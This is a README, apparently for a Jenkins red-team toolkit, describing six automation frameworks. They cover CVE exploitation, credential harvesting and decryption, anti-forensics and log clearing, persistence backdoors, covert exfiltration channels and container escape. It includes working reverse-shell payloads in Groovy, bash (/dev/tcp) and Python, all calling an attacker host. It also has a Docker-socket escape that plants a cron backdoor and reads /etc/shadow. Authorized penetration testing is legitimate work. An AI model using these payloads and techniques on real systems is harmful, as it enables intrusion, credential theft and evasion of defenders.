<!--
Jenkins exploitation automation frameworks, red team CI/CD tooling,
automated credential harvesting Jenkins, container escape exploitation,
stealth operations Jenkins penetration testing, reverse shell automation,
performance benchmarking exploitation, multi-phase attack chain automation,
Jenkins post-exploitation frameworks, offensive DevOps security research,
ridpath JenkinsBreaker advanced frameworks, CI/CD lateral movement automation
-->

# Advanced Red Team Automation Frameworks
Comprehensive Post-Exploitation & Attack Automation for Jenkins CI/CD Environments

---

## Overview

This suite provides six production-grade automation frameworks designed for professional red team operations, security research, and adversary simulation against Jenkins-based CI/CD infrastructure. Each framework operates independently while supporting coordinated multi-phase campaigns.

**Framework Categories:**
- **Exploitation Automation** - Multi-phase attack chain execution
- **Credential Operations** - Comprehensive secret harvesting and decryption
- **Stealth & Evasion** - Anti-forensics and detection avoidance
- **Container Security** - Escape analysis and privilege escalation
- **Remote Access** - Automated reverse shell deployment
- **Performance Analysis** - Exploitation timing and optimization

---

## Framework Index

| Framework | Purpose | Lines | Primary Use Case |
|-----------|---------|-------|------------------|
| **exploit_chain.sh** | Automated multi-phase exploitation | 328 | End-to-end attack automation |
| **credential_harvester.sh** | Secret extraction & categorization | 336 | Credential theft operations |
| **stealth_operations.sh** | Evasion & anti-forensics | 389 | Covert operational security |
| **container_escape.sh** | Container breakout analysis | 293 | Privilege escalation research |
| **reverse_shell_handler.sh** | Shell deployment & management | 119 | Interactive access establishment |
| **performance_benchmark.sh** | Timing analysis & optimization | 190 | Exploitation efficiency testing |

---

## 1. Exploit Chain Framework

**File:** `scripts/exploit_chain.sh`

Automated multi-phase exploitation framework that executes a complete attack lifecycle from reconnaissance through post-exploitation in a single coordinated operation.

### Attack Phases

**Phase 1: Reconnaissance & Fingerprinting**
- Jenkins version detection via HTTP headers and HTML parsing
- Authentication requirement analysis
- Installed plugin enumeration
- Vulnerable endpoint identification (CLI, Script Console, Stapler)

**Phase 2: Unauthenticated Exploitation**
- CVE-2024-23897: CLI arbitrary file read exploitation
- CVE-2018-1000861: Stapler ACL bypass
- Automated Java detection and CLI jar deployment

**Phase 3: Authenticated Exploitation**
- Default credential brute forcing (admin:admin)
- CVE-2019-1003029: Groovy script RCE execution
- System information extraction via Groovy reflection
- Jenkins configuration dumping (API JSON)
- Job and user enumeration

**Phase 4: Secrets Harvesting**
- Jenkins internal secrets (master.key, hudson.util.Secret)
- Encrypted credentials extraction (credentials.xml)
- AWS credential file parsing (~/.aws/credentials)
- SSH private key theft (id_rsa, id_ed25519)
- Docker registry credential extraction
- Environment variable filtering for sensitive data
- Sudo privilege enumeration (NOPASSWD detection)

**Phase 5: Post-Exploitation**
- Persistence backdoor user creation
- Build history extraction and analysis
- Job configuration XML dumping
- Artifact enumeration

**Phase 6: Automated Reporting**
- Exploitation success metrics
- Attack chain documentation
- Credential inventory
- Remediation recommendations

### Usage

```bash
# Basic exploitation against localhost
./scripts/exploit_chain.sh

# Target external Jenkins instance
./scripts/exploit_chain.sh http://target-jenkins:8080

# Review results
cat /tmp/jenkins-exploit-chain-*/EXPLOIT_REPORT.txt
cat /tmp/jenkins-exploit-chain-*/CREDENTIALS.txt
```

### Output Structure

```
/tmp/jenkins-exploit-chain-<PID>/
├── EXPLOIT_REPORT.txt          # Comprehensive attack summary
├── CREDENTIALS.txt             # Extracted credential inventory
├── jenkins-cli.jar             # Downloaded CLI tool
├── cli-file-read.txt           # Arbitrary file read results
├── stapler-bypass.html         # ACL bypass evidence
├── groovy-rce.txt              # RCE execution output
├── jenkins-config.json         # Full Jenkins configuration
├── jobs.txt                    # Enumerated job names
├── users.txt                   # User account list
├── master.key                  # Jenkins master encryption key
├── hudson.util.Secret          # Credential decryption key
├── credentials.xml             # Encrypted credential store
├── aws-credentials             # AWS access keys
├── id_rsa                      # SSH private key
├── docker-config.json          # Docker registry credentials
├── env-secrets.txt             # Environment variable secrets
├── sudo-permissions.txt        # Privilege information
├── backdoor.txt                # Persistence confirmation
├── build-history.json          # Build execution records
└── jobs/                       # Individual job configurations
    ├── job1.xml
    └── job2.xml
```

### MITRE ATT&CK Mapping

| Technique | ID | Implementation |
|-----------|----|-----------------|
| Exploit Public-Facing Application | T1190 | CVE exploitation (Phases 2-3) |
| Command Execution | T1059.006 | Groovy RCE (Phase 3) |
| Unsecured Credentials | T1552.001 | Credential harvesting (Phase 4) |
| Cloud Instance Metadata API | T1552.005 | AWS credential theft |
| Remote System Discovery | T1018 | Jenkins enumeration |
| Account Discovery | T1087 | User enumeration |
| Create Account | T1136 | Backdoor user creation |
| Data from Information Repositories | T1213 | Configuration extraction |

---

## 2. Credential Harvester Framework

**File:** `scripts/credential_harvester.sh`

Comprehensive credential extraction framework with seven-phase harvesting methodology targeting Jenkins containers and host systems.

### Harvesting Phases

**Phase 1: Jenkins Internal Secrets**
- master.key extraction with retry logic
- hudson.util.Secret retrieval (30s max wait)
- credentials.xml parsing and entry counting
- Additional Jenkins XML file discovery
- Automatic file existence validation

**Phase 2: File-Based Credentials**
- AWS credentials (~/.aws/credentials) with account enumeration
- SSH private keys (RSA, ED25519, ECDSA)
- Docker registry configuration (config.json with auth tokens)
- NPM authentication tokens (~/.npmrc)
- Maven settings with repository credentials
- Git credential store parsing

**Phase 3: Environment Variable Filtering**
- Keyword-based secret detection (key, token, password, secret, api)
- Case-insensitive pattern matching
- Multi-variable credential correlation

**Phase 4: Configuration Files**
- Database connection strings (database.env, .env files)
- API key configuration files
- Cloud provider credentials (GCP, Azure)
- Application-specific secrets

**Phase 5: Script Analysis**
- Bash script hardcoded credential detection
- Cron job secret scanning
- Jenkins Pipeline Groovy script analysis
- Shell history examination

**Phase 6: Memory Analysis**
- Process environment variable dumps
- Running process credential exposure
- Memory-resident secret detection

**Phase 7: Automated Categorization & Reporting**
- Credential type classification
- Decryption instruction generation
- Plaintext vs encrypted separation
- Priority-based reporting

### Usage

```bash
# Harvest from default Jenkins container
./scripts/credential_harvester.sh

# Target specific container
./scripts/credential_harvester.sh custom-jenkins-container

# Review categorized credentials
ls -R /tmp/jenkins-creds-*/
cat /tmp/jenkins-creds-*/HARVEST_REPORT.txt
```

### Output Structure

```
/tmp/jenkins-creds-<PID>/
├── encrypted/
│   ├── master.key              # Jenkins master encryption key
│   ├── hudson.util.Secret      # Credential decryption secret
│   ├── credentials.xml         # Encrypted credential store
│   └── *.xml                   # Additional Jenkins configs
├── plaintext/
│   ├── aws-credentials         # AWS access keys (plaintext)
│   ├── id_rsa                  # SSH private key (chmod 600)
│   ├── id_ed25519              # ED25519 key
│   ├── docker-config.json      # Docker registry tokens
│   ├── npmrc                   # NPM authentication
│   ├── maven-settings.xml      # Maven repository creds
│   ├── git-credentials         # Git credential store
│   └── env-vars.txt            # Environment secrets
├── analysis/
│   ├── script-secrets.txt      # Hardcoded secrets in scripts
│   ├── process-env.txt         # Process environment dumps
│   └── database-strings.txt    # Connection string analysis
└── HARVEST_REPORT.txt          # Summary with decryption instructions
```

### Decryption Instructions

To decrypt Jenkins credentials:

```bash
# Extract decryption keys
MASTER_KEY=$(cat /tmp/jenkins-creds-*/encrypted/master.key)
HUDSON_SECRET=$(cat /tmp/jenkins-creds-*/encrypted/hudson.util.Secret)

# Use offsec-jenkins for decryption
git clone https://github.com/gquere/offsec-jenkins
cd offsec-jenkins
python3 decrypt.py -m "$MASTER_KEY" -s "$HUDSON_SECRET" \
  -c /tmp/jenkins-creds-*/encrypted/credentials.xml
```

### Credential Priority Ranking

1. **Critical**: AWS access keys, SSH private keys, database passwords
2. **High**: Docker registry tokens, cloud provider credentials
3. **Medium**: API keys, NPM tokens, Git credentials
4. **Low**: Build artifacts, temporary tokens

---

## 3. Stealth Operations Framework

**File:** `scripts/stealth_operations.sh`

Advanced operational security framework implementing anti-forensics, log evasion, and detection avoidance techniques for covert Jenkins operations.

### Operational Phases

**Phase 1: Log Evasion**
- Log file location discovery and mapping
- Jenkins audit logging detection
- Log clearing payload generation (Groovy)
- Logging disablement scripts
- Timestamp manipulation for file modification concealment
- Build log deletion automation

**Phase 2: Anti-Forensics**
- Evidence removal automation (bash history, tmp files)
- System log clearing (/var/log/*)
- Timestomping techniques
- Memory-only execution strategies
- Artifact cleanup automation

**Phase 3: Traffic Obfuscation**
- Slow scan timing randomization
- User-Agent rotation (legitimate browser profiles)
- Request timing jitter (human-like behavior)
- Tor proxy integration support
- HTTP header randomization

**Phase 4: Persistence Mechanisms**
- Stealth backdoor user creation with legitimate-looking names
- SSH authorized_keys injection
- Cron job persistence (masked as system tasks)
- Jenkins job-based persistence
- Plugin backdoor deployment

**Phase 5: Covert Communication**
- DNS tunneling payload generation
- ICMP tunneling scripts
- Slow HTTP exfiltration (steganography-ready)
- WebSocket covert channel establishment
- Encrypted C2 beacon templates

**Phase 6: Detection Avoidance**
- Process name spoofing techniques
- EDR evasion strategies (AMSI bypass, ETW disablement)
- Behavioral randomization (timing, order)
- Low-and-slow operation mode
- Endpoint detection testing

### Usage

```bash
# Basic stealth operation against localhost
./scripts/stealth_operations.sh

# Full stealth mode with custom container
./scripts/stealth_operations.sh http://target:8080 custom-jenkins

# Deploy specific stealth components
# Log clearing only
docker exec jenkins-lab groovy /tmp/jenkins-stealth-*/clear-logs.groovy

# Timestamp manipulation
docker exec jenkins-lab bash /tmp/jenkins-stealth-*/timestamp-manipulation.sh

# Deploy persistence backdoor
docker exec jenkins-lab bash /tmp/jenkins-stealth-*/persistence-cron.sh
```

### Generated Payloads

```
/tmp/jenkins-stealth-<PID>/
├── clear-logs.groovy           # Jenkins build log deletion
├── disable-logging.groovy      # Runtime logging disablement
├── timestamp-manipulation.sh   # File modification time spoofing
├── cleanup-traces.sh           # Evidence removal automation
├── memory-only-execution.sh    # Disk-less operation
├── user-agent-rotation.txt     # Legitimate UA strings
├── slow-scan-timing.sh         # Randomized request timing
├── backdoor-user.groovy        # Stealth user creation
├── ssh-persistence.sh          # SSH key injection
├── persistence-cron.sh         # Cron job backdoor
├── dns-tunnel.py               # DNS exfiltration channel
├── icmp-tunnel.sh              # ICMP covert communication
├── slow-http-exfil.py          # Throttled data exfiltration
├── process-spoof.sh            # Process name masking
└── STEALTH_REPORT.txt          # Operational security summary
```

### Stealth Level Configuration

**HIGH** (Default):
- Randomized 5-30 second delays between operations
- User-Agent rotation every request
- Log clearing after each phase
- Timestamp manipulation enabled

**MEDIUM**:
- 2-10 second delays
- Static legitimate User-Agent
- Periodic log clearing
- No timestamp modification

**LOW**:
- Minimal delays (500ms-2s)
- Default tooling User-Agent
- No log manipulation
- Speed over stealth

### Detection Evasion Checklist

- [ ] Clear bash history after each command
- [ ] Disable Jenkins audit logging
- [ ] Use memory-only payloads where possible
- [ ] Rotate User-Agent strings
- [ ] Randomize operation timing
- [ ] Clear build logs after extraction
- [ ] Manipulate file timestamps to blend in
- [ ] Use legitimate-looking account names
- [ ] Encrypt C2 traffic
- [ ] Implement slow exfiltration

---

## 4. Container Escape Framework

**File:** `scripts/container_escape.sh`

Container security assessment and privilege escalation framework analyzing escape vectors and generating exploitation payloads for Docker environments.

### Analysis Phases

**Phase 1: Container Environment Analysis**
- Linux capability enumeration (CAP_SYS_ADMIN detection)
- Privileged mode detection
- Docker socket mount identification (/var/run/docker.sock)
- Cgroup mount analysis
- Seccomp profile inspection
- AppArmor/SELinux status

**Phase 2: File System Analysis**
- Host filesystem mount detection
- Writable host path identification
- Sensitive directory exposure (/root, /etc, /home)
- Kernel module accessibility
- Shared namespace analysis

**Phase 3: Process Context Analysis**
- Root user confirmation
- Sudo privilege enumeration
- SUID binary discovery
- Capability-based escalation vectors
- Init process detection (PID 1 analysis)

**Phase 4: Network Analysis**
- Network mode detection (host, bridge, none)
- Network interface enumeration
- Host network accessibility
- Firewall rule inspection
- Inter-container communication paths

**Phase 5: Exploit Generation**
- Docker socket breakout script generation
- Privileged container escape (cgroup manipulation)
- Release_agent exploit automation
- Kernel exploit applicability testing
- Custom escape payload creation

**Phase 6: Post-Escape Automation**
- Host enumeration scripts
- Credential theft from host filesystem
- Cloud metadata service access (AWS, GCP, Azure)
- Lateral movement preparation
- Persistence establishment on host

### Usage

```bash
# Analyze default Jenkins container
./scripts/container_escape.sh

# Analyze specific container
./scripts/container_escape.sh custom-jenkins-container

# Execute generated escape exploit
bash /tmp/jenkins-escape-*/docker-socket-exploit.sh

# Post-escape enumeration
bash /tmp/jenkins-escape-*/post-escape-enum.sh
```

### Escape Vector Detection

**Critical Vectors (Immediate Escape Possible):**
- Docker socket mounted (/var/run/docker.sock)
- Container running in privileged mode
- CAP_SYS_ADMIN capability present

**High-Risk Vectors:**
- Writable cgroup mounts
- Host filesystem mounts (/host, /rootfs)
- Seccomp disabled/unconfined

**Medium-Risk Vectors:**
- SUID binaries present
- Shared PID namespace
- Host network mode

**Low-Risk Vectors:**
- Default container configuration
- Limited capabilities
- Seccomp enforced

### Generated Exploits

```
/tmp/jenkins-escape-<PID>/
├── capabilities.txt                # Linux capability listing
├── suspicious-mounts.txt           # Host filesystem mounts
├── suid-binaries.txt               # SUID binary inventory
├── docker-socket-exploit.sh        # Socket-based escape
├── privileged-escape.sh            # Cgroup release_agent exploit
├── cgroup-release-agent.sh         # Automated cgroup breakout
├── kernel-exploit-check.sh         # Kernel vulnerability testing
├── post-escape-enum.sh             # Host enumeration
├── host-credential-theft.sh        # Post-escape credential harvesting
├── cloud-metadata-access.sh        # AWS/GCP/Azure metadata queries
├── host-persistence.sh             # Backdoor installation on host
└── ESCAPE_REPORT.txt               # Comprehensive escape analysis
```

### Docker Socket Escape Example

```bash
# Generated exploit using Docker socket
#!/bin/bash
# Mount host filesystem and chroot
docker run -v /:/hostfs --rm -it alpine chroot /hostfs sh

# Now you have root access to the host filesystem
# Install persistence
echo '* * * * * root /tmp/.backdoor' >> /hostfs/etc/crontab

# Extract host credentials
cat /hostfs/root/.ssh/id_rsa
cat /hostfs/etc/shadow
```

### Post-Escape Objectives

1. **Host Enumeration**: Identify OS, kernel, installed software
2. **Credential Theft**: Extract SSH keys, shadow file, cloud credentials
3. **Lateral Movement**: Identify other hosts, containers, cloud resources
4. **Persistence**: Install backdoors, SSH keys, cron jobs
5. **Privilege Escalation**: Exploit host vulnerabilities for additional access

---

## 5. Reverse Shell Handler Framework

**File:** `scripts/reverse_shell_handler.sh`

Automated reverse shell deployment and management framework supporting multiple payload types and background listener orchestration.

### Capabilities

**Payload Types:**
- **Groovy**: Native Jenkins script console execution
- **Bash**: Traditional /dev/tcp reverse shell
- **Python**: Socket-based reverse shell

**Automation Features:**
- Automatic netcat listener spawning
- Background process management
- Payload templating and substitution
- Jenkins script console deployment
- Interactive shell monitoring
- PID tracking for cleanup

### Usage

```bash
# Deploy Groovy reverse shell (default)
./scripts/reverse_shell_handler.sh 10.10.14.5 9001

# Deploy bash reverse shell
./scripts/reverse_shell_handler.sh 10.10.14.5 9001 http://target:8080 bash

# Deploy Python reverse shell
./scripts/reverse_shell_handler.sh 10.10.14.5 9001 http://target:8080 python

# Monitor shell output
tail -f /tmp/jenkins-shells-*/shell-output.txt

# Cleanup listener
kill $(cat /tmp/jenkins-shells-*/listener.pid)
```

### Parameters

1. **LHOST**: Attacker IP address for reverse connection
2. **LPORT**: Listening port (default: 9001)
3. **TARGET**: Jenkins URL (default: http://localhost:8080)
4. **SHELL_TYPE**: Payload type - groovy, bash, python (default: groovy)

### Payload Templates

**Groovy Reverse Shell:**
```groovy
String host="10.10.14.5";
int port=9001;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){
    while(pi.available()>0)so.write(pi.read());
    while(pe.available()>0)so.write(pe.read());
    while(si.available()>0)po.write(si.read());
    so.flush();po.flush();
    Thread.sleep(50);
    try {p.exitValue();break;} catch (Exception e){}
};
p.destroy();s.close();
```

**Bash Reverse Shell:**
```bash
bash -i >& /dev/tcp/10.10.14.5/9001 0>&1
```

**Python Reverse Shell:**
```python
import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(('10.10.14.5',9001));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
subprocess.call(['/bin/bash','-i'])
```

### Interactive Commands

```bash
# Execute commands on compromised Jenkins
echo 'whoami' | nc 10.10.14.5 9001
echo 'id' | nc 10.10.14.5 9001
echo 'cat /etc/passwd' | nc 10.10.14.5 9001
echo 'cat /var/jenkins_home/secrets/master.key' | nc 10.10.14.5 9001

# Upgrade to full TTY
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Background with Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

### Process Management

```
Listener PID: <stored in shell-info.txt>
Deploy PID: <background deployment process>
Output: /tmp/jenkins-shells-<PID>/shell-output.txt
```

---

## 6. Performance Benchmark Framework

**File:** `scripts/performance_benchmark.sh`

Exploitation performance testing and timing analysis framework for measuring attack efficiency and optimizing operational speed.

### Benchmark Categories

**Phase 1: Reconnaissance Benchmarks**
- Version fingerprinting timing
- Plugin enumeration speed
- Job list retrieval performance
- API endpoint response times

**Phase 2: Exploitation Benchmarks**
- CLI jar download speed (measured in 5 iterations)
- Script console access timing
- Groovy code execution latency
- Stapler endpoint access performance

**Phase 3: Data Exfiltration Benchmarks**
- Master key extraction speed
- Credentials XML retrieval timing
- Environment variable dump performance
- Secrets extraction efficiency

### Usage

```bash
# Run with default iterations (10)
./scripts/performance_benchmark.sh

# Custom target and iterations
./scripts/performance_benchmark.sh http://target:8080 20

# Analyze results
cat /tmp/jenkins-benchmark-*/BENCHMARK_REPORT.txt

# Import CSV for graphing
cat /tmp/jenkins-benchmark-*/timings.csv
```

### Metrics Collected

For each operation:
- **Average**: Mean execution time across all iterations
- **Min**: Fastest execution time observed
- **Max**: Slowest execution time observed

### Performance Ratings

- **Excellent**: < 100ms (Real-time exploitation viable)
- **Good**: 100-500ms (Automated attack chains viable)
- **Moderate**: 500-1000ms (Acceptable for manual operations)
- **Slow**: > 1000ms (Optimization recommended)

### Output Format

```
TIMING RESULTS
==============
Version Fingerprinting                       45 ms (min:    32, max:    67)
Plugin Enumeration                          152 ms (min:   134, max:   178)
Job List Retrieval                           89 ms (min:    76, max:   112)
CLI Jar Download                           2341 ms (min:  2198, max:  2487)
Script Console Access                        67 ms (min:    54, max:    89)
Groovy Code Execution                       123 ms (min:   108, max:   145)
Stapler Endpoint Access                      43 ms (min:    38, max:    56)
Master Key Extraction                        12 ms (min:     9, max:    18)
Credentials XML Extraction                   15 ms (min:    11, max:    22)
Environment Variable Dump                     8 ms (min:     6, max:    13)

PERFORMANCE RATINGS
===================
Version Fingerprinting                       Excellent
Plugin Enumeration                           Good
Job List Retrieval                           Excellent
CLI Jar Download                             Slow
Script Console Access                        Excellent
Groovy Code Execution                        Good
Stapler Endpoint Access                      Excellent
Master Key Extraction                        Excellent
Credentials XML Extraction                   Excellent
Environment Variable Dump                    Excellent
```

### CSV Export

Results are exported to `timings.csv` for graphing and trend analysis:

```csv
Version Fingerprinting,45,32,67
Plugin Enumeration,152,134,178
Job List Retrieval,89,76,112
```

### Optimization Recommendations

**Based on benchmark results:**

1. **Parallel Execution**: Operations < 100ms can be batched
2. **Sequential Execution**: Operations > 1000ms should run independently
3. **Retry Logic**: Operations with high variance (max/min ratio > 2) need error handling
4. **Caching**: Repeated operations < 50ms are candidates for local caching

---

## Operational Integration

### Sequential Execution (Full Red Team Campaign)

```bash
# 1. Initial reconnaissance and exploitation
./scripts/exploit_chain.sh http://target:8080

# 2. Deep credential harvesting
./scripts/credential_harvester.sh jenkins-container

# 3. Establish reverse shell
./scripts/reverse_shell_handler.sh 10.10.14.5 9001 http://target:8080

# 4. Container escape if applicable
./scripts/container_escape.sh jenkins-container

# 5. Enable stealth mode for persistence
./scripts/stealth_operations.sh http://target:8080 jenkins-container

# 6. Benchmark exfiltration timing
./scripts/performance_benchmark.sh http://target:8080
```

### Parallel Execution (High-Speed Operations)

```bash
# Launch multiple frameworks simultaneously
./scripts/exploit_chain.sh http://target:8080 &
./scripts/credential_harvester.sh jenkins-container &
./scripts/performance_benchmark.sh http://target:8080 &
wait
```

### Output Correlation

All frameworks store output in `/tmp/` with descriptive naming:

```
/tmp/jenkins-exploit-chain-12345/
/tmp/jenkins-creds-12346/
/tmp/jenkins-stealth-12347/
/tmp/jenkins-escape-12348/
/tmp/jenkins-shells-12349/
/tmp/jenkins-benchmark-12350/
```

---

## Technical Requirements

**Operating System:**
- Linux (WSL2 supported)
- Bash 4.0+

**Dependencies:**
- Docker and Docker Compose
- curl
- netcat (nc)
- Java (optional, for CLI exploitation)
- Python3 (optional, for advanced payloads)

**Network Access:**
- Target Jenkins instance accessible
- Outbound connectivity for reverse shells
- Docker daemon accessible (for container operations)

---

## Security Considerations

### Operational Security

1. **Network Isolation**: Run frameworks in isolated networks to prevent detection
2. **Traffic Encryption**: Use VPN/Tor for production assessments
3. **Log Sanitization**: Clear all framework output after operations
4. **Credential Handling**: Encrypt harvested credentials immediately
5. **Process Cleanup**: Kill all background processes after completion

### Legal & Ethical Guidelines

**Authorized Use Only:**
- Written permission required for production systems
- Document scope of engagement before execution
- Obtain legal authorization for container escape testing
- Respect data privacy regulations (GDPR, CCPA)

**Prohibited Activities:**
- Unauthorized access to systems
- Data destruction or corruption
- Denial of service attacks
- Credential reuse outside engagement scope

---

## Troubleshooting

### Common Issues

**Framework not executing:**
```bash
# Fix line endings (Windows/WSL compatibility)
sed -i 's/\r$//' scripts/*.sh
chmod +x scripts/*.sh
```

**Docker commands failing:**
```bash
# Verify Docker access
docker ps
sudo usermod -aG docker $USER
newgrp docker
```

**Jenkins not accessible:**
```bash
# Verify Jenkins is running
docker ps | grep jenkins
curl -I http://localhost:8080
```

**Empty credential output:**
```bash
# Jenkins may not be fully initialized
# Wait 120s after startup, then retry
sleep 120
./scripts/credential_harvester.sh
```

**Reverse shell not connecting:**
```bash
# Verify firewall rules
sudo ufw allow 9001/tcp

# Test listener manually
nc -lvnp 9001

# Check Jenkins can reach LHOST
docker exec jenkins-lab ping -c 1 <LHOST>
```

---

## Performance Optimization

### Speed Recommendations

**Fast Operations (< 1 second):**
- Version fingerprinting
- Environment variable extraction
- Groovy RCE execution

**Medium Operations (1-5 seconds):**
- Plugin enumeration
- Credential XML parsing
- Job configuration extraction

**Slow Operations (> 5 seconds):**
- CLI jar download
- Full credential harvesting (7 phases)
- Container escape analysis

**Optimization Strategy:**
- Run slow operations first while faster ones are queued
- Use parallel execution for independent operations
- Cache CLI jar after first download
- Implement early exit for failed authentication

---

## Framework Versioning

**Current Version:** 1.0.0
**Last Updated:** 2026-01-17

**Changelog:**
- 1.0.0 (2026-01-17): Initial release with 6 frameworks
  - exploit_chain.sh: 6-phase automated exploitation
  - credential_harvester.sh: 7-phase secret extraction
  - stealth_operations.sh: 6-phase anti-forensics
  - container_escape.sh: 6-phase escape analysis
  - reverse_shell_handler.sh: Multi-payload shell deployment
  - performance_benchmark.sh: 3-phase timing analysis

---

<!--
Jenkins red team automation, CI/CD exploitation frameworks,
container escape testing tools, credential harvesting automation,
stealth penetration testing Jenkins, reverse shell frameworks,
performance benchmarking exploits, multi-phase attack chains,
offensive DevOps security tooling, Jenkins post-exploitation,
ridpath JenkinsBreaker automation suite, CI/CD lateral movement
-->
